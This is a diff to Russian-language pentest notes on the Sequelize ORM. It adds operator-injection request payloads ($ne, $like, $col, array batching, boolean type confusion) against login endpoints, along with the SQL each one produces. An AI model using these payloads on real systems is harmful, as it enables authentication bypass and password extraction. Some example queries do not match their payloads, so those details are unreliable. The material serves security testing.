@@ -1,3 +1,5 @@
+Sequelize — это ORM-библиотека на Node.js для Postgres, MySQL, MariaDB, SQLite и Microsoft SQL Server
+
 # Безопасное исполнение ORM
 При использовании ORM - нужно понять какая версия используется в продукте. Если у нее есть CVE - найти.
 Изучить документацию ORM
@@ -162,3 +164,49 @@ User.findAll({
   "lastName": ":firstName"
 }
 Sequelize сначала сгенерирует такой запрос: SELECT * FROM users WHERE soundex("firstName") = soundex(:firstName) OR "lastName" = ':firstName'
+
+### Атаки на operatorAliases 
+Групповая атака (Batching attack)
+```
+POST /
+{'username': ['admin','user1','user2'], 'password': 'foo'}
+```
+Такого вида запрос к приложению инициирует запрос к базе:
+Executing (default): SELECT `id`, `username`, `email`, `password`, `createdAt`, `updatedAt` FROM `users` AS `users` WHERE `users`.`username` IN ('admin', 'more', 'much more') AND `users`.`password` = 'wrong pass' LIMIT 1;
+При помощи этой атаки можно за один запрос к серверу проверить на валидность много логинов на конкретный пароль и наоборот. Атака работает в последней на декабрь 2020 версии библиотеки (6.3.5) и при выключенной опции operatorsAliases.
+
+Атака преобразования типов данных
+```
+POST /
+{'username': ['admin','user1','user2'], 'password': true}
+```
+Логическое условие в базу данных хоть и будет правильным 'password': true, проверка пароля в исследуемом приложении на уровне приложения и сравнение разных типов данных не может вернуть true.
+
+
+Атака при помощи операторов сравнения
+```
+POST /
+{'username': ['admin','user1','user2'], 'password': {'$ne': 'foo'}}
+```
+По данным будет сгенерирован запрос в базу вида:
+SELECT `id`, `username`, `email`, `password`, `createdAt`, `updatedAt` FROM `users` AS `users` WHERE `users`.`username` = 'admin' AND `users`.`password` != 'foo' LIMIT 1;
+База данных возвращает данные, так как есть совпадение username = admin и пароля, не равного “aaa”. Для того чтобы пройти процесс авторизации полностью, нам необходимо достать пароль.
+
+
+Атака операторов регулярных выражений и поиска в строке
+```
+POST /
+{'username': ['admin','user1','user2'], 'password': {'$like': 'A%'}}
+```
+Получить исходные данные можно, используя псевдонимы операторов поиска $like или операторов для работы с регулярными выражениями $regexp. Когда символ A не сойдется, возникнет ошибка, что пользователь не найден. Если символ сойдется, будет ошибка о неверном пароле. В базу выполняется запрос вида:
+SELECT `id`, `username`, `email`, `password`, `createdAt`, `updatedAt` FROM `users` AS `users` WHERE `users`.`username` = 'admin' AND `users`.`password` LIKE 'A%' LIMIT 1;
+Таким образом, посимвольно можно восстановить данные из таблицы.
+
+Атака сравнения столбцов в таблице
+```
+POST /
+{'username': ['admin','user1','user2'], 'password': {'$col': 'aaa'}}
+```
+Запрос в базу будет:
+SELECT `id`, `username`, `email`, `password`, `createdAt`, `updatedAt` FROM `users` AS `users` WHERE `users`.`username` = 'admin' AND `users`.`password` = `aaaaa` LIMIT 1;
+Тем самым выполнив логическое условие на уровне базы данных.
